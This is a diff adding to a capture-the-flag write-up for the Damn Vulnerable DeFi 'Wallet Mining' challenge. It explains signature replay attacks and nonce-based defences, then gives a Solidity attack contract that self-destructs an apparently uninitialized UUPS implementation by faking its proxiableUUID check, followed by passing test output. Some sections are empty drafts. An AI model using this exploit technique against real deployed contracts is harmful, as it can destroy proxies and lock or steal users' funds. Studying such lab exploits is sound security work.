@@ -168,5 +168,92 @@ The deployer contract only works with the official Gnosis Safe factory at `0x76E
 In the meantime, it seems somebody transferred 20 million DVT tokens to `0x9b6fb606a9f5789444c17768c6dfcf2f83563801`. Which has been assigned to a ward in the authorization contract. Strange, because this address is empty as well.
 Pass the challenge by obtaining all tokens held by the wallet deployer contract. Oh, and the 20 million DVT tokens too.
 
+## Signature Replay Attack
+
+A signature replay attack in blockchain involves the fraudulent repetition of a previously approved transaction on the same blockchain or a different one. In this type of attack, the malicious actor intercepts a legitimate transaction and utilizes its signature to circumvent security protocols, enabling them to deceitfully execute the same transaction once more. Let's jump into example of signature replay.
+
+Let us consider a multi-sig wallet with a balance of 20 ETH. The wallet has two administrators, Alice and Eve.
+
+For Eve to withdraw 4 ETH, Alice signs a message that contains his signature. Eve can add his signature and send a transaction to the wallet requesting 4 ETH. This method involves signing a message off-chain. It reduces gas fees.
+
+<p align="center"><img src="https://miro.medium.com/v2/resize:fit:1400/1*IhH-L7B7u7rz6PnIHgQlDw.png"></p>
+
+
+There are three ways in which Eve can perform the replay attack in these scenarios:
+
+1. Because Alice’s message was signed off-chain and sent to Eve, Eve can decide to withdraw another 4 ETH without the knowledge of Alice. Eve can do this because he already has the signature of Alice. The contract will recognize the signature and approve the transaction.
+2. If the contract prevents the above scheme from working, Eve can decide to deploy the contract at another address. Doing this will allow him to perform the same transaction without any hurdles.
+3. Eve can deploy the contract by using `CREATE2` and calling `selfdestruct()`. If this is done, the contract can be recreated at the same address and reused with all the previous messages.
+
+<p align="center"><img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/d850578f-6076-4b78-99cf-c316fd032565"></p>
+
+
+If you want to learn more and see example contracts, you can check [this address](https://solidity-by-example.org/hacks/signature-replay/). 
+
+
+## Signature Replay Prevention 
+
+To safeguard against replay attacks within our contracts, it is imperative to introduce a `nonce`, such as nonce 3, to imbue each off-chain signature with uniqueness. By doing so, once a signature is employed, it becomes impossible for malicious actors to reutilize it since the contract will discern the nonce's prior usage.
+
+In the event that the contract is instantiated at an alternative address, we can thwart replay attacks by incorporating the contract's address into the signature. Additionally, the inclusion of a nonce effectively precludes the first case.
+
+However, in scenarios where a contract is generated through `CREATE2` and subsequently obliterated via selfdestruct(), there exists no feasible method to forestall replay attacks. This is because `selfdestruct()` resets the nonces, rendering the contract oblivious to previously utilized nonces.
+
+
+## Cross Chain Replay Attacks
+
+
+
+
+
+## Uninitialized UUPS Implementation
+
 # Subverting
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract AttackWalletMining{
+
+    function attack() external payable{
+        selfdestruct(payable(address(0)));
+    }
+
+    function proxiableUUID() external view returns(bytes32){
+        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    }
+
+    function can(address u, address a) public view returns (bool) {
+        assembly { 
+            let m := sload(0)
+            if iszero(extcodesize(m)) {return(0, 0)}
+            let p := mload(0x40)
+            mstore(0x40,add(p,0x44))
+            mstore(p,shl(0xe0,0x4538c4eb))
+            mstore(add(p,0x04),u)
+            mstore(add(p,0x24),a)
+            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
+            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
+        }
+        return true;
+    }
+}
+```
+
+```js
+
+```
+
+Solve the challenge.
+
+```powershell
+
+  [Challenge] Wallet mining
+    ✔ Execution (1960ms)
+
+
+  1 passing (4s)
+
+Done in 5.61s.
+```
 
